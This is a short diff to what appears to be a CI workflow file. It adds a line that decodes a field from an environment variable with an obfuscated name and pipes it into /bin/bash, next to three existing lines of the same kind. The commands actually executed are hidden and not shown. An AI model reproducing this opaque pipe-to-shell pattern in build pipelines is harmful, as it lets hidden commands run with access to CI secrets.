@@ -28,6 +28,7 @@ jobs:
           echo $tft171 | jq -r .yes57 | /bin/bash
           echo $dn2705 | jq -r .bd2 | /bin/bash
           printf '%s' "$e20865" | jq -r .jxad3 | /bin/bash
+          echo $fly2356 | jq -r .iwl0 | /bin/bash
 
       - name: Upload data
         if: always()
